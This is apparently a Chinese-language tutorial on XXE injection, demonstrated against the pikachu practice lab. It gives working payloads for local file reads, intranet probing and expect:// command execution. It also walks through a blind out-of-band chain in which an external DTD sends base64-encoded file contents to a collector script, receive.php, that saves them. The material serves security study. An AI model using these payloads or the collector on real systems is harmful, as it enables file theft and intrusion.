![](https://gitee.com/YatJay/image/raw/master/img/202203152045563.png)

# 涉及知识

### 概念

#### XML、XXE基础概念

XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。(XML可以理解为一种数据格式)

XXE(XML External Entity Injection)漏洞全称XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。

#### XML与HTML的主要差异

XML被设计为传输和存储数据，其焦点是数据的内容。——一种数据格式

HTML被设计用来显示数据，其焦点是数据的外观。

HTML旨在显示信息，而XML旨在传输信息。

XML代码示例如下

```xml
<!--文档类型定义-->
<!DOCTYPE note [	<!--定义此文档时note类型的文档-->
<!ELEMENT note (to,from,heading,body)>	<!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>			<!--定义to元素为"#PCDATA"类型-->
<!ELEMENT from (#PCDATA)>		<!--定义from元素为"#PCDATA"类型-->
<!ELEMENT head (#PCDATA)>		<!--定义head元素为"#PCDATA"类型-->
<!ELEMENT body (#PCDATA)>		<!--定义body元素为"#PCDATA"类型-->
]]]>

<!--文档元素-->
<note>
    <to>Dave</to>
    <from>Tom</from>
    <head>Reminder</head>
    <body>You are a good man</body>
</note>
```



## 危害

XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。

文件读取

RCE执行

内网攻击

DOS攻击

## 检测

==//////////////////////==

# 演示案例

## pikachu靶场xml数据传输测试——回显、写法、协议、引入

各个脚本支持的协议如下

![](https://gitee.com/YatJay/image/raw/master/img/202203152056277.png)

在pikachu的XXE靶场中，已知此处存在一个XXE漏洞，如何利用此处的XXE漏洞，其payload写法一般是通用的(此案例不要求掌握为什么此处会出现XXE，只要求利用，漏洞成因后续讲解)

### 有回显XXE漏洞读文件

#### 用法

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
		<!ENTITY xxe SYSTEM "file:///[文件位置]">
]>
<x>&xxe;</x>
```

**备注：**前提条件是存在那个文件

#### 演示

本地D盘下存在一个名为`www.txt`的文件，内容是`123456789`，利用该XXE漏洞进行读取，则payload如下：

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
		<!ENTITY xxe SYSTEM "file:///D:/www.txt">
]>
<x>&xxe;</x>
```

成功读取

![](https://gitee.com/YatJay/image/raw/master/img/202203152105019.png)

### XXE漏洞内网探针或攻击内网应用(触发漏洞地址)

#### 用法

```xml
<?xml version = "1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTYTY rabbit SYSTEM "http://内网IP:端口/文件名">
]>
<x>&rabbit;</x>
```

**备注：**上面的ip地址假设就是内网的一台服务器的ip地址。还可以进行一个端口扫描，看一下端口是否开放。

#### 利用

如果访问成功，则会通过Web服务器访问内网地址，可以利用此漏洞

1. 探测该内网IP的指定端口是否开放：引号内写成`http://内网IP:端口`
2. 若有端口开放，则探测该内网IP的指定文件是否存在：引号内写成`http://内网IP:端口/文件名`



### XXE漏洞进行RCE

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
		<!ENTITY xxe SYSTEM "expect://id">  //id是对于的执行的命令。
]>
<x>&xxe;</x>
```

**备注：**需要目标服务器时安装expect扩展的PHP环境里执行系统命令。条件较为苛刻，实战情况比较难碰到。

### XXE漏洞引入外部实体DTD

#### 用法

相当于让目标服务器访问外部链接，使得外部`.dtd`文件(相当于一种xml文件)的内容，被目标服务器当做`.xml`文件来执行。即核心代码payload写在外部的`.dtd`文件中

```xml
<?xml version = "1.0"?>
<!DOCTYPE test [
		<!ENTITY % file SYSTEM "http://127.0.0.1/evil2.dtd">
		%file;
]>
<x>&send;</x>
```
下面的是我们外部的写入文件`evil2.dtd`的内容

```
<!ENTITY send SYSTEM "file:///d:/test.txt">
```

一旦XXE漏洞使得目标服务器成功访问到外部实体文件，则会执行外部实体文件的内容

**备注：**条件：看对方的代码有没有禁用外部实体引用，这也是防御XXE的一种措施。如果禁用外部实体，即使存在XXE漏洞，目标服务器也不能执行外部实体内容。类似文件包含中的远程包含。

#### 演示

127.0.0.1主机的www目录下存在一个evil2.dtd，内容如下

```
<!ENTITY send SYSTEM "file:///d:/www.txt">
```

构造payload读取D盘下的`www.txt`文件，内容是`abcdefg`

```
<?xml version = "1.0"?>
<!DOCTYPE test [
		<!ENTITY % file SYSTEM "http://127.0.0.1/evil2.dtd">
		%file;
]>
<x>&send;</x>
```

在XXE漏洞处执行上述payload，成功通过XXE执行外部实体内容，访问到`www.txt`文件内容

![](https://gitee.com/YatJay/image/raw/master/img/202203152128024.png)

### 无回显XXE漏洞读取文件

#### 写法

```xml
<?xml version = "1.0"?>
<!DOCTYPE test [
		<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt">
		<!ENTITY % dtd SYSTEM "http://192.168.xx.xxx:80XX/test.dtd">
		%dtd;
		%send;
]>
```

远程文件`test.dtd`内容如下
```dtd
<!ENTITY % payload
	"<!ENTITY &#x25; send SYSTEM
'http://192.168.xx.xxx:80xx/?data=%file;'>"
>
%payload;
```

上面xml的payload中的URL一般是自己的网站地址

第一步：PHP伪协议访问服务器自己的文件，将访问文件内容写到`%file`当中

第二步：访问远程的dtd文件，把PHP伪协议读取到的数据`%file`赋给`data`变量，并以GET方法提交给远程的攻击者服务器

第三步：我们只需要在自己的网站日志，或者写个php脚本接收上述`data`变量值，就能看到读取到的文件数据了。

#### 示例

在pikachu的XXE靶场中修改代码，使得该XXE无回显

修改源代码位置：`pikachu/vul/xxe/xxe_1.php`，在82行左右存在以下代码，注释掉`echo`等内容如下：

```
<?php //echo $html;?>
```

之后提交payload则前端不会有回显

##### 已知信息如下

目标服务器D盘下存在文件`test.txt`，内容为`I am a hacker`

攻击者IP为127.0.0.1，其www目录下存在文件`test.dtd`和`receive.php`

##### XXE的XML payload及作用

构造XXE漏洞的payload  

```xml
<?xml version = "1.0"?>
<!DOCTYPE test [
		<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt">
		<!ENTITY % dtd SYSTEM "http://127.0.0.1:80/test.dtd">
		%dtd;
		%send;
]>
```

1. 目标服务器XXE漏洞执行读取敏感文件后，将敏感文件内容保存到`%file`中

2. 目标服务器访问远程的攻击者服务器上的`dtd`文件，`%file`会赋值给一个PHP变量

##### 攻击者的test.dtd及作用

`test.dtd`内容如下：注意%号要进行实体编码成&#x25

```
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://127.0.0.1:80/receive.php?data=%file;'>">%payload;
```

该`dtd`文件将上述`%file`赋值给一个GET参数data，并将这个GET参数提交到远程攻击者服务器的`receive.php`文件处理

##### 攻击者的receive.php及作用

receive.php：

```php
<?php 
    $data = $_GET["data"]; 
    $myfile = fopen("data.txt", "w");
    fwrite($myfile, $data);
	fclose($myfile);
?>
```

`receive.php`文件接收传来的GET参数data的值，并写入文件`data.txt`中



因此，只要使目标服务器XXE漏洞能触发payload读取自身文件，即便前端没有回显，也可以在攻击者的服务器上的data.txt文件中就能看到目标服务器文件内容，或者在攻击者服务器的日志中查看到目标服务器文件内容。

附：[phpstudy开启网站Apache访问日志和错误日志并按日期划分创建](https://www.seoshipin.cn/jianzhan/phpstudy/2172.ht)

##### 按照上述思路成功解决XXE漏洞无回显

将payload提交到XXE漏洞处，并无回显显示，但其实文件内容已经发送到攻击者服务器，并保存在`data.txt`文件中

![](https://gitee.com/YatJay/image/raw/master/img/202203152311154.png)

查看攻击者服务器的www目录，新生成一个`data.txt`文件，内容如下

![](https://gitee.com/YatJay/image/raw/master/img/202203152312994.png)

使用base64解密后文件内容如下

![](https://gitee.com/YatJay/image/raw/master/img/202203152312398.png)

若开启了Apache的日志，也可看到GET参数提交的内容，和最终保存在data.txt中的内容是相同的

![](https://gitee.com/YatJay/image/raw/master/img/202203152316890.png)

### XXE读文件绕过——协议读文件绕过

https://www.cnblogs.com/20175211lyz/p/11413335.html

## XXE-lab靶场登录框新命令数据传输测试——检测发现







## CTF-Vulnhub-XXE安全真题复现——检测、利用、拓展、实战







## CTF-Jarvis-OJ-Web-XXE安全真题复现——数据请求格式







## XXE安全漏洞自动化注射脚本工具——XXEinjector(Ruby)





# 涉及资源

http://web.jarvisoj.com:9882/

https://github.com/cOny1/xxe-lab

https://github.com/enjoiz/XXEinjector

https://download.vulnhub.com/xxe/XXE.zip

https://www.cnblogs.com/bmjoker/p/9614990.html

XXE漏洞详细参考：https://www.cnblogs.com/20175211lyz/p/11413335.html